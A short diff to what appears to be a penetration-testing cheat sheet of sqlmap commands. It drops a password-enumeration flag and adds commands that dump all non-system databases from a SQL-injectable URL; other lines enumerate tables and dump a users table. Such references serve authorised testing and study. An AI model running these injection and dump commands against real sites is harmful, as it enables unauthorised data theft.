@@ -441,10 +441,14 @@ sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successf
 sqlmap -u "www.example.com/?q=test" --prefix='%'))' --suffix='-- -'         '# May need single/double quotes for prefix/suffix...
 
 # Basic DB enumeration
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --hostname --passwords
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --hostname
 
 # Table enumeration
 sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+# Dump all, exlcuding sysdbs
+sqlmap -u "http://www.example.com/?id=1" --dump --exclude-sysdbs
+sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
 
 # Table row enumeration
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
